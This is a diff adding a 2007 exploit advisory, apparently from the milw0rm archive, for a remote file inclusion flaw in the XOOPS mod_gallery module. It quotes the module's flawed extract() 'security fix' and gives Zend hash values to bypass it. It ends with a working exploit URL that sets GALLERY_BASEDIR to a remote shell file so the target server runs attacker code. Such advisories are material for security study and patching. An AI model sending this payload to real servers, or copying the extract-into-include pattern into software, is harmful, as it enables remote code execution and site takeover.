@@ -1,0 +1,61 @@
+----[ XOOPS mod_gallery Zend_Hash_key + Extract RFI ... ITDefence.ru Antichat.ru ]
+
+						XOOPS mod_gallery Zend_Hash_key + Extract REMOTE FILE INCLUDE
+							Eugene Minaev underwater@itdefence.ru
+				___________________________________________________________________
+			____/  __ __ _______________________ _______  _______________    \  \   \
+			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
+			/ /     /_//              /\        /       /      /         /     /___/
+			\/        /              / /       /       /\     /         /         /
+			/        /               \/       /       / /    /         /__       //\
+			\       /    ____________/       /        \/    __________// /__    // /   
+			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
+			\ \\                                                               // // /
+			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
+			. \_\\________[________________________________________]_________//_//_/ . .
+		 
+		
+		Bug works only with register_globals = OFF . I find their security fix very fun , and you ? : )
+		
+		<?php
+		/* Begin Security Fix */
+		$scrubList = array('HTTP_GET_VARS', 'HTTP_POST_VARS', 'HTTP_COOKIE_VARS', 'HTTP_POST_FILES');
+		foreach ($scrubList as $outer) 
+		{
+			foreach ($scrubList as $inner) 
+			{
+				if (isset(${$outer}[$inner])) 
+				{
+					unset(${$outer}[$inner]);
+				}
+			}
+		}  
+		....some php code...
+		/* End Security Fix */
+		extract($_GET);
+		extract($_POST);
+		extract($_COOKIE);  
+		?>
+		
+		Hah .. very serious security fix , yeah  :) 
+		
+		<?php
+		if (substr(PHP_OS, 0, 3) == 'WIN') {
+		require_once($GALLERY_BASEDIR . "platform/fs_win32.php");
+		} else {
+		require_once($GALLERY_BASEDIR . "platform/fs_unix.php");
+		} 
+		?>
+		
+		zend_hash_key_calc.exe GALLERY_BASEDIR
+		
+		GALLERY_BASEDIR
+		PHP5 hash: -2093085906
+		PHP4 hash: -995617320
+		
+		test.ru/xoopsgallery/init_basic.php?GALLERY_BASEDIR=http://path/to/m0nzt3r_shell.txt?&2093085906=1&995617320=2
+		
+
+----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]
+
+# milw0rm.com [2008-01-06]
